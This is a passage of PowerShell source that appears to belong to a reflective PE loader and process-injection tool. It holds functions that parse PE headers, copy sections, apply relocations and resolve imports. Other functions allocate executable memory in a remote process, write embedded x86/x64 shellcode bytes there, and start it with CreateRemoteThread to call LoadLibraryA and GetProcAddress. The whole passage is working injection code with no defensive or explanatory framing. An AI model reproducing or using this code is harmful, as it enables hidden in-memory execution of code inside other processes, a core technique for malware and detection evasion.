		$PEInfo | Add-Member -MemberType NoteProperty -Name 'OriginalImageBase' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.ImageBase)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfHeaders' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfHeaders)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'DllCharacteristics' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.DllCharacteristics)
		
		#Free the memory allocated above, this isn't where we allocate the PE to memory
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($UnmanagedPEBytes)
		
		return $PEInfo
	}


	#PEInfo must contain the following NoteProperties:
	#	PEHandle: An IntPtr to the address the PE is loaded to in memory
	Function Get-PEDetailedInfo
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true)]
		[IntPtr]
		$PEHandle,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Types,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)
		
		if ($PEHandle -eq $null -or $PEHandle -eq [IntPtr]::Zero)
		{
			throw 'PEHandle is null or IntPtr.Zero'
		}
		
		$PEInfo = New-Object System.Object
		
		#Get NtHeaders information
		$NtHeadersInfo = Get-ImageNtHeaders -PEHandle $PEHandle -Win32Types $Win32Types
		
		#Build the PEInfo object
		$PEInfo | Add-Member -MemberType NoteProperty -Name PEHandle -Value $PEHandle
		$PEInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value ($NtHeadersInfo.IMAGE_NT_HEADERS)
		$PEInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value ($NtHeadersInfo.NtHeadersPtr)
		$PEInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value ($NtHeadersInfo.PE64Bit)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
		
		if ($PEInfo.PE64Bit -eq $true)
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS64)))
			$PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
		}
		else
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS32)))
			$PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $SectionHeaderPtr
		}
		
		if (($NtHeadersInfo.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_DLL) -eq $Win32Constants.IMAGE_FILE_DLL)
		{
			$PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'DLL'
		}
		elseif (($NtHeadersInfo.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE) -eq $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE)
		{
			$PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'EXE'
		}
		else
		{
			Throw "PE file is not an EXE or DLL"
		}
		
		return $PEInfo
	}
	
	
	Function Import-DllInRemoteProcess
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		$RemoteProcHandle,
		
		[Parameter(Position=1, Mandatory=$true)]
		[IntPtr]
		$ImportDllPathPtr
		)
		
		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		
		$ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)
		$DllPathSize = [UIntPtr][UInt64]([UInt64]$ImportDllPath.Length + 1)
		$RImportDllPathPtr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		if ($RImportDllPathPtr -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process"
		}

		[UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
		$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RImportDllPathPtr, $ImportDllPathPtr, $DllPathSize, [Ref]$NumBytesWritten)
		
		if ($Success -eq $false)
		{
			Throw "Unable to write DLL path to remote process memory"
		}
		if ($DllPathSize -ne $NumBytesWritten)
		{
			Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
		}
		
		$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
		$LoadLibraryAAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "LoadLibraryA") #Kernel32 loaded to the same address for all processes
		
		[IntPtr]$DllAddress = [IntPtr]::Zero
		#For 64bit DLL's, we can't use just CreateRemoteThread to call LoadLibrary because GetExitCodeThread will only give back a 32bit value, but we need a 64bit address
		#	Instead, write shellcode while calls LoadLibrary and writes the result to a memory address we specify. Then read from that memory once the thread finishes.
		if ($PEInfo.PE64Bit -eq $true)
		{
			#Allocate memory for the address returned by LoadLibraryA
			$LoadLibraryARetMem = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $DllPathSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			if ($LoadLibraryARetMem -eq [IntPtr]::Zero)
			{
				Throw "Unable to allocate memory in the remote process for the return value of LoadLibraryA"
			}
			
			
			#Write Shellcode to the remote process which will call LoadLibraryA (Shellcode: LoadLibraryA.asm)
			$LoadLibrarySC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			$LoadLibrarySC2 = @(0x48, 0xba)
			$LoadLibrarySC3 = @(0xff, 0xd2, 0x48, 0xba)
			$LoadLibrarySC4 = @(0x48, 0x89, 0x02, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
			
			$SCLength = $LoadLibrarySC1.Length + $LoadLibrarySC2.Length + $LoadLibrarySC3.Length + $LoadLibrarySC4.Length + ($PtrSize * 3)
			$SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
			$SCPSMemOriginal = $SCPSMem
			
			Write-BytesToMemory -Bytes $LoadLibrarySC1 -MemoryAddress $SCPSMem
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC1.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($RImportDllPathPtr, $SCPSMem, $false)
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
			Write-BytesToMemory -Bytes $LoadLibrarySC2 -MemoryAddress $SCPSMem
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC2.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($LoadLibraryAAddr, $SCPSMem, $false)
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
			Write-BytesToMemory -Bytes $LoadLibrarySC3 -MemoryAddress $SCPSMem
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC3.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($LoadLibraryARetMem, $SCPSMem, $false)
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
			Write-BytesToMemory -Bytes $LoadLibrarySC4 -MemoryAddress $SCPSMem
			$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($LoadLibrarySC4.Length)

			
			$RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			if ($RSCAddr -eq [IntPtr]::Zero)
			{
				Throw "Unable to allocate memory in the remote process for shellcode"
			}
			
			$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
			if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
			{
				Throw "Unable to write shellcode to remote process memory."
			}
			
			$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
			$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
			if ($Result -ne 0)
			{
				Throw "Call to CreateRemoteThread to call GetProcAddress failed."
			}
			
			#The shellcode writes the DLL address to memory in the remote process at address $LoadLibraryARetMem, read this memory
			[IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
			$Result = $Win32Functions.ReadProcessMemory.Invoke($RemoteProcHandle, $LoadLibraryARetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
			if ($Result -eq $false)
			{
				Throw "Call to ReadProcessMemory failed"
			}
			[IntPtr]$DllAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])

			$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $LoadLibraryARetMem, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
			$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		}
		else
		{
			[IntPtr]$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $LoadLibraryAAddr -ArgumentPtr $RImportDllPathPtr -Win32Functions $Win32Functions
			$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
			if ($Result -ne 0)
			{
				Throw "Call to CreateRemoteThread to call GetProcAddress failed."
			}
			
			[Int32]$ExitCode = 0
			$Result = $Win32Functions.GetExitCodeThread.Invoke($RThreadHandle, [Ref]$ExitCode)
			if (($Result -eq 0) -or ($ExitCode -eq 0))
			{
				Throw "Call to GetExitCodeThread failed"
			}
			
			[IntPtr]$DllAddress = [IntPtr]$ExitCode
		}
		
		$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RImportDllPathPtr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		
		return $DllAddress
	}
	
	
	Function Get-RemoteProcAddress
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		$RemoteProcHandle,
		
		[Parameter(Position=1, Mandatory=$true)]
		[IntPtr]
		$RemoteDllHandle,
		
		[Parameter(Position=2, Mandatory=$true)]
		[IntPtr]
		$FunctionNamePtr,#This can either be a ptr to a string which is the function name, or, if LoadByOrdinal is 'true' this is an ordinal number (points to nothing)

        [Parameter(Position=3, Mandatory=$true)]
        [Bool]
        $LoadByOrdinal
		)

		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])

		[IntPtr]$RFuncNamePtr = [IntPtr]::Zero   #Pointer to the function name in remote process memory if loading by function name, ordinal number if loading by ordinal
        #If not loading by ordinal, write the function name to the remote process memory
        if (-not $LoadByOrdinal)
        {
        	$FunctionName = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($FunctionNamePtr)

		    #Write FunctionName to memory (will be used in GetProcAddress)
		    $FunctionNameSize = [UIntPtr][UInt64]([UInt64]$FunctionName.Length + 1)
		    $RFuncNamePtr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $FunctionNameSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		    if ($RFuncNamePtr -eq [IntPtr]::Zero)
		    {
			    Throw "Unable to allocate memory in the remote process"
		    }

		    [UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
		    $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RFuncNamePtr, $FunctionNamePtr, $FunctionNameSize, [Ref]$NumBytesWritten)
		    if ($Success -eq $false)
		    {
			    Throw "Unable to write DLL path to remote process memory"
		    }
		    if ($FunctionNameSize -ne $NumBytesWritten)
		    {
			    Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
		    }
        }
        #If loading by ordinal, just set RFuncNamePtr to be the ordinal number
        else
        {
            $RFuncNamePtr = $FunctionNamePtr
        }
		
		#Get address of GetProcAddress
		$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
		$GetProcAddressAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "GetProcAddress") #Kernel32 loaded to the same address for all processes

		
		#Allocate memory for the address returned by GetProcAddress
		$GetProcAddressRetMem = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UInt64][UInt64]$PtrSize, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		if ($GetProcAddressRetMem -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process for the return value of GetProcAddress"
		}
		
		
		#Write Shellcode to the remote process which will call GetProcAddress
		#Shellcode: GetProcAddress.asm
		[Byte[]]$GetProcAddressSC = @()
		if ($PEInfo.PE64Bit -eq $true)
		{
			$GetProcAddressSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			$GetProcAddressSC2 = @(0x48, 0xba)
			$GetProcAddressSC3 = @(0x48, 0xb8)
			$GetProcAddressSC4 = @(0xff, 0xd0, 0x48, 0xb9)
			$GetProcAddressSC5 = @(0x48, 0x89, 0x01, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
		}
		else
		{
			$GetProcAddressSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xc0, 0xb8)
			$GetProcAddressSC2 = @(0xb9)
			$GetProcAddressSC3 = @(0x51, 0x50, 0xb8)
			$GetProcAddressSC4 = @(0xff, 0xd0, 0xb9)
			$GetProcAddressSC5 = @(0x89, 0x01, 0x89, 0xdc, 0x5b, 0xc3)
		}
		$SCLength = $GetProcAddressSC1.Length + $GetProcAddressSC2.Length + $GetProcAddressSC3.Length + $GetProcAddressSC4.Length + $GetProcAddressSC5.Length + ($PtrSize * 4)
		$SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
		$SCPSMemOriginal = $SCPSMem
		
		Write-BytesToMemory -Bytes $GetProcAddressSC1 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC1.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($RemoteDllHandle, $SCPSMem, $false)
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		Write-BytesToMemory -Bytes $GetProcAddressSC2 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC2.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($RFuncNamePtr, $SCPSMem, $false)
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		Write-BytesToMemory -Bytes $GetProcAddressSC3 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC3.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($GetProcAddressAddr, $SCPSMem, $false)
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		Write-BytesToMemory -Bytes $GetProcAddressSC4 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC4.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($GetProcAddressRetMem, $SCPSMem, $false)
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
		Write-BytesToMemory -Bytes $GetProcAddressSC5 -MemoryAddress $SCPSMem
		$SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC5.Length)
		
		$RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
		if ($RSCAddr -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process for shellcode"
		}
		[UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
		$Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
		if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
		{
			Throw "Unable to write shellcode to remote process memory."
		}
		
		$RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
		$Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
		if ($Result -ne 0)
		{
			Throw "Call to CreateRemoteThread to call GetProcAddress failed."
		}
		
		#The process address is written to memory in the remote process at address $GetProcAddressRetMem, read this memory
		[IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
		$Result = $Win32Functions.ReadProcessMemory.Invoke($RemoteProcHandle, $GetProcAddressRetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
		if (($Result -eq $false) -or ($NumBytesWritten -eq 0))
		{
			Throw "Call to ReadProcessMemory failed"
		}
		[IntPtr]$ProcAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])

        #Cleanup remote process memory
		$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		$Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $GetProcAddressRetMem, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null

        if (-not $LoadByOrdinal)
        {
            $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RFuncNamePtr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        }
		
		return $ProcAddress
	}


	Function Copy-Sections
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Byte[]]
		$PEBytes,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
			$SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)
		
			#Address to copy the section to
			[IntPtr]$SectionDestAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$SectionHeader.VirtualAddress))
			
			#SizeOfRawData is the size of the data on disk, VirtualSize is the minimum space that can be allocated
			#    in memory for the section. If VirtualSize > SizeOfRawData, pad the extra spaces with 0. If
			#    SizeOfRawData > VirtualSize, it is because the section stored on disk has padding that we can throw away,
			#    so truncate SizeOfRawData to VirtualSize
			$SizeOfRawData = $SectionHeader.SizeOfRawData

			if ($SectionHeader.PointerToRawData -eq 0)
			{
				$SizeOfRawData = 0
			}
			
			if ($SizeOfRawData -gt $SectionHeader.VirtualSize)
			{
				$SizeOfRawData = $SectionHeader.VirtualSize
			}
			
			if ($SizeOfRawData -gt 0)
			{
				Test-MemoryRangeValid -DebugString "Copy-Sections::MarshalCopy" -PEInfo $PEInfo -StartAddress $SectionDestAddr -Size $SizeOfRawData | Out-Null
				[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, [Int32]$SectionHeader.PointerToRawData, $SectionDestAddr, $SizeOfRawData)
			}
		
			#If SizeOfRawData is less than VirtualSize, set memory to 0 for the extra space
			if ($SectionHeader.SizeOfRawData -lt $SectionHeader.VirtualSize)
			{
				$Difference = $SectionHeader.VirtualSize - $SizeOfRawData
				[IntPtr]$StartAddress = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$SectionDestAddr) ([Int64]$SizeOfRawData))
				Test-MemoryRangeValid -DebugString "Copy-Sections::Memset" -PEInfo $PEInfo -StartAddress $StartAddress -Size $Difference | Out-Null
				$Win32Functions.memset.Invoke($StartAddress, 0, [IntPtr]$Difference) | Out-Null
			}
		}
	}


	Function Update-MemoryAddresses
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$OriginalImageBase,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		[Int64]$BaseDifference = 0
		$AddDifference = $true #Track if the difference variable should be added or subtracted from variables
		[UInt32]$ImageBaseRelocSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_BASE_RELOCATION)
		
		#If the PE was loaded to its expected address or there are no entries in the BaseRelocationTable, nothing to do
		if (($OriginalImageBase -eq [Int64]$PEInfo.EffectivePEHandle) `
				-or ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.Size -eq 0))
		{
			return
		}


		elseif ((Compare-Val1GreaterThanVal2AsUInt ($OriginalImageBase) ($PEInfo.EffectivePEHandle)) -eq $true)
		{
			$BaseDifference = Sub-SignedIntAsUnsigned ($OriginalImageBase) ($PEInfo.EffectivePEHandle)
			$AddDifference = $false
		}
		elseif ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.EffectivePEHandle) ($OriginalImageBase)) -eq $true)
		{
			$BaseDifference = Sub-SignedIntAsUnsigned ($PEInfo.EffectivePEHandle) ($OriginalImageBase)
		}
		
		#Use the IMAGE_BASE_RELOCATION structure to find memory addresses which need to be modified
		[IntPtr]$BaseRelocPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.VirtualAddress))
		while($true)
		{
			#If SizeOfBlock == 0, we are done
			$BaseRelocationTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($BaseRelocPtr, [Type]$Win32Types.IMAGE_BASE_RELOCATION)

			if ($BaseRelocationTable.SizeOfBlock -eq 0)
			{
				break
			}

			[IntPtr]$MemAddrBase = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$BaseRelocationTable.VirtualAddress))
			$NumRelocations = ($BaseRelocationTable.SizeOfBlock - $ImageBaseRelocSize) / 2

			#Loop through each relocation
			for($i = 0; $i -lt $NumRelocations; $i++)
			{
				#Get info for this relocation
				$RelocationInfoPtr = [IntPtr](Add-SignedIntAsUnsigned ([IntPtr]$BaseRelocPtr) ([Int64]$ImageBaseRelocSize + (2 * $i)))
				[UInt16]$RelocationInfo = [System.Runtime.InteropServices.Marshal]::PtrToStructure($RelocationInfoPtr, [Type][UInt16])

				#First 4 bits is the relocation type, last 12 bits is the address offset from $MemAddrBase
				[UInt16]$RelocOffset = $RelocationInfo -band 0x0FFF
				[UInt16]$RelocType = $RelocationInfo -band 0xF000
				for ($j = 0; $j -lt 12; $j++)
				{
					$RelocType = [Math]::Floor($RelocType / 2)
				}

				#For DLL's there are two types of relocations used according to the following MSDN article. One for 64bit and one for 32bit.
				#This appears to be true for EXE's as well.
				#	Site: http://msdn.microsoft.com/en-us/magazine/cc301808.aspx
				if (($RelocType -eq $Win32Constants.IMAGE_REL_BASED_HIGHLOW) `
						-or ($RelocType -eq $Win32Constants.IMAGE_REL_BASED_DIR64))
				{			
					#Get the current memory address and update it based off the difference between PE expected base address and actual base address
					[IntPtr]$FinalAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$MemAddrBase) ([Int64]$RelocOffset))
					[IntPtr]$CurrAddr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FinalAddr, [Type][IntPtr])
		
					if ($AddDifference -eq $true)
					{
						[IntPtr]$CurrAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$CurrAddr) ($BaseDifference))
					}
					else
					{
						[IntPtr]$CurrAddr = [IntPtr](Sub-SignedIntAsUnsigned ([Int64]$CurrAddr) ($BaseDifference))
					}				

					[System.Runtime.InteropServices.Marshal]::StructureToPtr($CurrAddr, $FinalAddr, $false) | Out-Null
				}
				elseif ($RelocType -ne $Win32Constants.IMAGE_REL_BASED_ABSOLUTE)
				{
					#IMAGE_REL_BASED_ABSOLUTE is just used for padding, we don't actually do anything with it
					Throw "Unknown relocation found, relocation value: $RelocType, relocationinfo: $RelocationInfo"
				}
			}
			
			$BaseRelocPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$BaseRelocPtr) ([Int64]$BaseRelocationTable.SizeOfBlock))
		}
	}


	Function Import-DllImports
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Types,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 4, Mandatory = $false)]
		[IntPtr]
		$RemoteProcHandle
		)
		
		$RemoteLoading = $false
		if ($PEInfo.PEHandle -ne $PEInfo.EffectivePEHandle)
		{
			$RemoteLoading = $true
		}
		
		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
		{
			[IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
			
			while ($true)
			{
				$ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
				
				#If the structure is null, it signals that this is the end of the array
				if ($ImportDescriptor.Characteristics -eq 0 `
						-and $ImportDescriptor.FirstThunk -eq 0 `
						-and $ImportDescriptor.ForwarderChain -eq 0 `
						-and $ImportDescriptor.Name -eq 0 `
						-and $ImportDescriptor.TimeDateStamp -eq 0)
				{
					Write-Verbose "Done importing DLL imports"
					break
				}

				$ImportDllHandle = [IntPtr]::Zero
				$ImportDllPathPtr = (Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name))
				$ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)
				
				if ($RemoteLoading -eq $true)
				{
					$ImportDllHandle = Import-DllInRemoteProcess -RemoteProcHandle $RemoteProcHandle -ImportDllPathPtr $ImportDllPathPtr
				}
				else
				{
					$ImportDllHandle = $Win32Functions.LoadLibrary.Invoke($ImportDllPath)
				}

				if (($ImportDllHandle -eq $null) -or ($ImportDllHandle -eq [IntPtr]::Zero))
				{
					throw "Error importing DLL, DLLName: $ImportDllPath"
				}
				
				#Get the first thunk, then loop through all of them
				[IntPtr]$ThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.FirstThunk)
				[IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.Characteristics) #Characteristics is overloaded with OriginalFirstThunk
				[IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])
				
				while ($OriginalThunkRefVal -ne [IntPtr]::Zero)
				{
                    $LoadByOrdinal = $false
                    [IntPtr]$ProcedureNamePtr = [IntPtr]::Zero
					#Compare thunkRefVal to IMAGE_ORDINAL_FLAG, which is defined as 0x80000000 or 0x8000000000000000 depending on 32bit or 64bit
					#	If the top bit is set on an int, it will be negative, so instead of worrying about casting this to uint
					#	and doing the comparison, just see if it is less than 0
					[IntPtr]$NewThunkRef = [IntPtr]::Zero
					if([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4 -and [Int32]$OriginalThunkRefVal -lt 0)
					{
						[IntPtr]$ProcedureNamePtr = [IntPtr]$OriginalThunkRefVal -band 0xffff #This is actually a lookup by ordinal
                        $LoadByOrdinal = $true
					}
